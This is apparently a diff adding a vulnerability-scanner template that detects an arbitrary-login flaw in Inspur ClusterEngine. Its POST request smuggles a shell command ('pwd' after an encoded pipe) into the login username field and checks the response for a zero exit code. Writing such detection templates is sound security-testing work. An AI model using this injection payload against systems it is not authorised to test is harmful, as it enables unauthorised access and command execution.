@@ -1,0 +1,28 @@
+id: inspur-clusterengine-anyuser-login
+info:
+  name: Inspur ClusterEngine Arbitrary User Login Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access
+http:
+  - raw:
+      - |
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        op=login&username=aa%7Cpwd&password=123123
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"out":'
+          - '"exitcode":0'
+      - type: word
+        part: header
+        words:
+          - "text/json"
